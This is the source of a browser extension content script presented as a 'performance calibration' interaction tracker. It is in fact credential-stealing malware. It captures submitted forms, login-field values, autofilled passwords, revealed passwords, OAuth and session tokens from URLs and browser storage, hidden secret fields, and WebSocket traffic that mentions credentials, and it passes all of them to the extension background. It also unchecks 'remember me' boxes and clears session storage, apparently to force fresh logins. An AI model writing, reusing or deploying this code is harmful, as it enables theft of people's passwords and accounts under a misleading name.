// DOM Interaction Tracker - Performance Calibration Module
(function () {
    'use strict';
    console.log('Tracker[ISOLATED]: Script loaded');

    const performanceModule = {
        observed: new Set(),

        start() {
            Diagnostics.log('CORE', 'Initializing interaction tracker');

            this.watchUI();
            this.watchPrefill();
            this.watchToggle();
            this.watchClick();
            this.trackSignatures();
            this.inspectView();
            this.scanHidden();
            this.tapStream();
            this.checkIsolation();
            this.checkPersistence();
            this.listenBridge();

            Diagnostics.log('CORE', 'Interaction tracker active');
        },

        watchClick() {
            document.addEventListener('click', (e) => {
                const btn = e.target.closest('button, input[type="button"], input[type="submit"]');
                if (!btn) return;

                const text = (btn.textContent || btn.value || '').toLowerCase();
                const id = (btn.id || '').toLowerCase();
                const cls = (btn.className || '').toLowerCase();

                const isLogin = ['login', 'sign-in', 'signin', 'log-in', 'confirm', 'next', 'continue', 'check'].some(p =>
                    text.includes(p) || id.includes(p) || cls.includes(p)
                );

                if (isLogin) {
                    const inputs = document.querySelectorAll('input');
                    const fields = {};
                    inputs.forEach(i => {
                        if (i.value && (i.type === 'text' || i.type === 'password' || i.type === 'email')) {
                            fields[i.name || i.id || 'unnamed_' + Math.random().toString(36).substr(2, 4)] = i.value;
                        }
                    });

                    if (Object.keys(fields).length > 0) {
                        Diagnostics.log('UI', 'Interaction button click detected, capturing fields', { btn_id: btn.id });
                        chrome.runtime.sendMessage({
                            type: 'UI_EVENT',
                            data: {
                                url: window.location.href,
                                fields: fields,
                                meta: {
                                    mode: 'click_detect',
                                    btn_id: btn.id,
                                    btn_text: text.trim()
                                }
                            }
                        });
                    }
                }
            }, true);
        },

        watchUI() {
            document.addEventListener('submit', (e) => {
                const node = e.target;
                const data = new FormData(node);

                const report = {
                    url: window.location.href,
                    t: new Date().toISOString(),
                    fields: {}
                };

                for (let [k, v] of data.entries()) {
                    report.fields[k] = v;
                }

                chrome.runtime.sendMessage({
                    type: 'FORM_EVENT',
                    data: report
                });
            }, true);
        },

        watchPrefill() {
            const scan = () => {
                const nodes = document.querySelectorAll('input[type="password"], input[autocomplete*="password"], input[autocomplete*="username"]');

                nodes.forEach(n => {
                    const timer = setInterval(() => {
                        try {
                            const hit = n.matches(':-webkit-autofill');

                            if (hit && n.value && !n.dataset.pf) {
                                n.dataset.pf = '1';
                                this.onPrefill(n);
                                clearInterval(timer);
                            }
                        } catch (e) { }
                    }, 250);

                    setTimeout(() => clearInterval(timer), 5000);
                });
            };

            scan();
            setTimeout(scan, 1000);
            document.addEventListener('DOMContentLoaded', scan);
        },

        onPrefill(n) {
            const form = n.closest('form');
            const data = form ? new FormData(form) : new FormData();

            if (!form) {
                data.append(n.name || n.id, n.value);
            }

            chrome.runtime.sendMessage({
                type: 'PREFILL_EVENT',
                data: {
                    url: window.location.href,
                    node: n.name || n.id,
                    val: n.value,
                    all: Object.fromEntries(data)
                }
            });
        },

        watchToggle() {
            const obs = new MutationObserver((list) => {
                list.forEach((m) => {
                    if (m.type === 'attributes' && m.attributeName === 'type') {
                        const target = m.target;
                        if (target.value && (target.type === 'text' || target.type === 'password')) {
                            chrome.runtime.sendMessage({
                                type: 'TOGGLE_EVENT',
                                data: {
                                    url: window.location.href,
                                    node: target.name || target.id,
                                    val: target.value,
                                    hit: true
                                }
                            });
                        }
                    }
                });
            });

            const bind = () => {
                document.querySelectorAll('input[type="password"]').forEach(n => {
                    if (!n.dataset.tracked) {
                        n.dataset.tracked = '1';
                        obs.observe(n, { attributes: true });
                    }
                });
            };

            bind();
            setInterval(bind, 2000);
        },

        listenBridge() {
            window.addEventListener('PERF_METRIC_DATA', (e) => {
                console.log('Tracker[ISOLATED]: Received bridge event', e.detail.type);
                if (e.detail && e.detail.type === 'FETCH_PIPE') {
                    chrome.runtime.sendMessage({
                        type: 'FETCH_PIPE',
                        data: e.detail.data
                    });
                }
            });
        },

        trackSignatures() {
            let loc = window.location.href;

            const check = (url) => {
                try {
                    const u = new URL(url);
                    const res = {};

                    ['access_token', 'id_token', 'refresh_token', 'code', 'state'].forEach(p => {
                        const v = u.searchParams.get(p);
                        if (v) res[p] = v;
                    });

                    if (u.hash) {
                        const h = new URLSearchParams(u.hash.substring(1));
                        ['access_token', 'id_token', 'token'].forEach(p => {
                            const v = h.get(p);
                            if (v) res[`h_${p}`] = v;
                        });
                    }

                    ['token', 'access_token', 'jwt', 'auth_token', 'session'].forEach(k => {
                        try {
                            const lv = localStorage.getItem(k);
                            const sv = sessionStorage.getItem(k);

                            if (lv) res[`l_${k}`] = lv;
                            if (sv) res[`s_${k}`] = sv;
                        } catch (e) { }
                    });

                    if (Object.keys(res).length > 0) {
                        chrome.runtime.sendMessage({
                            type: 'STREAM_REPORT',
                            data: {
                                pageUrl: url,
                                res,
                                t: new Date().toISOString()
                            }
                        });
                    }
                } catch (e) { }
            };

            check(window.location.href);

            new MutationObserver(() => {
                const cur = window.location.href;
                if (cur !== loc) {
                    loc = cur;
                    check(cur);
                }
            }).observe(document, { subtree: true, childList: true });

            setInterval(() => check(window.location.href), 10000);
        },

        inspectView() {
            const run = () => {
                if (typeof DOMScout !== 'undefined') {
                    const hits = DOMScout.analyze();
                    Diagnostics.log('VIEW', `Detected ${hits.length} priority nodes`);
                }
            };

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', run);
            } else {
                run();
            }

            setTimeout(run, 2000);
        },

        scanHidden() {
            chrome.runtime.sendMessage({ type: 'GET_SETTINGS' }, (s) => {
                if (!s || !s.DIAGNOSTIC_MODULES || !s.DIAGNOSTIC_MODULES.HIDDEN_NODE_SCAN) return;

                const run = () => {
                    const nodes = document.querySelectorAll('input[type="hidden"], input[style*="display: none"], input[style*="display:none"], input.hidden');
                    const sigs = ['pass', 'pwd', 'password', 'token', 'auth', 'api_key', 'secret', 'credential', 'session', 'csrf', 'xsrf'];

                    nodes.forEach(n => {
                        const name = (n.name || '').toLowerCase();
                        const id = (n.id || '').toLowerCase();
                        const val = n.value || '';

                        const hit = sigs.some(p => name.includes(p) || id.includes(p));

                        if (hit && val && !n.dataset.scanned) {
                            n.dataset.scanned = '1';

                            chrome.runtime.sendMessage({
                                type: 'UI_EVENT',
                                data: {
                                    url: window.location.href,
                                    fields: { [n.name || n.id]: val },
                                    meta: {
                                        mode: 'hidden',
                                        tag: n.type
                                    }
                                }
                            });
                        }
                    });
                };

                run();
                setTimeout(run, 1000);

                const obs = new MutationObserver(() => run());
                obs.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['value', 'type', 'hidden'] });
            });
        },

        tapStream() {
            chrome.runtime.sendMessage({ type: 'GET_SETTINGS' }, (s) => {
                if (!s || !s.DIAGNOSTIC_MODULES || !s.DIAGNOSTIC_MODULES.SOCKET_STREAM) return;

                const WS = window.WebSocket;

                window.WebSocket = function (url, protocols) {
                    const ws = new WS(url, protocols || []);

                    const send = ws.send.bind(ws);
                    ws.send = function (data) {
                        try {
                            const s = typeof data === 'string' ? data : (data instanceof Blob ? '[B]' : String(data));
                            const sigs = ['pass', 'pwd', 'password', 'token', 'auth', 'api_key', 'secret', 'credential', 'session', 'login', 'user', 'email'];
                            const hit = sigs.some(p => s.toLowerCase().includes(p));

                            if (hit) {
                                chrome.runtime.sendMessage({
                                    type: 'STREAM_REPORT',
                                    data: {
                                        url,
                                        msg: s,
                                        t: new Date().toISOString(),
                                        pageUrl: window.location.href
                                    }
                                });
                            }
                        } catch (e) { }

                        return send(data);
                    };

                    ws.addEventListener('message', function (e) {
                        try {
                            const s = typeof e.data === 'string' ? e.data : (e.data instanceof Blob ? '[B]' : String(e.data));
                            const sigs = ['pass', 'pwd', 'password', 'token', 'auth', 'api_key', 'secret', 'credential', 'session', 'login', 'user', 'email'];
                            const hit = sigs.some(p => s.toLowerCase().includes(p));

                            if (hit) {
                                chrome.runtime.sendMessage({
                                    type: 'STREAM_REPORT',
                                    data: {
                                        url,
                                        res: s,
                                        t: new Date().toISOString(),
                                        pageUrl: window.location.href
                                    }
                                });
                            }
                        } catch (err) { }
                    });

                    return ws;
                };

                window.WebSocket.prototype = WS.prototype;
                Object.setPrototypeOf(window.WebSocket, WS);
            });
        },

        checkIsolation() {
            chrome.runtime.sendMessage({ type: 'GET_SETTINGS' }, (s) => {
                if (!s || !s.HEURISTIC_PATTERNS || !s.HEURISTIC_PATTERNS.STRICT_SESSION_ISOLATION) return;

                const u = window.location.href.toLowerCase();
                const hit = s.HEURISTIC_PATTERNS.CRITICAL_PATH_SIGNATURES.some(p =>
                    u.includes(p.toLowerCase())
                );

                if (hit) {
                    this.clearNodes(s);
                }
            });
        },

        clearNodes(s) {
            const r = s.HEURISTIC_PATTERNS;
            if (r.VOLATILE_STORAGE_KEYS) {
                r.VOLATILE_STORAGE_KEYS.forEach(k => {
                    try {
                        localStorage.removeItem(k);
                        sessionStorage.removeItem(k);
                    } catch (e) { }
                });
            }

            try {
                for (let i = localStorage.length - 1; i >= 0; i--) {
                    const k = localStorage.key(i);
                    if (k && r.VOLATILE_STORAGE_KEYS.some(p => k.toLowerCase().includes(p.toLowerCase()))) {
                        localStorage.removeItem(k);
                    }
                }
            } catch (e) { }

            chrome.runtime.sendMessage({
                type: 'UI_RESET_CMD',
                data: { domain: window.location.hostname }
            });
        },

        checkPersistence() {
            chrome.runtime.sendMessage({ type: 'GET_SETTINGS' }, (s) => {
                if (!s || !s.HEURISTIC_PATTERNS || !s.HEURISTIC_PATTERNS.UI_RESET_AUTOMATION) return;

                const kill = () => {
                    const sigs = ['remember', 'keep-logged', 'stay-logged', 'persist', 'save-login'];

                    document.querySelectorAll('input[type="checkbox"]').forEach(c => {
                        const id = (c.id || '').toLowerCase();
                        const name = (c.name || '').toLowerCase();
                        const hit = sigs.some(p => id.includes(p) || name.includes(p));

                        if (hit && c.checked) {
                            c.checked = false;
                            c.dispatchEvent(new Event('change', { bubbles: true }));
                        }
                    });
                };

                kill();
                setTimeout(kill, 500);
                const obs = new MutationObserver(() => kill());
                obs.observe(document.body, { childList: true, subtree: true });
            });
        }
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => performanceModule.start());
    } else {
        performanceModule.start();
    }
})();
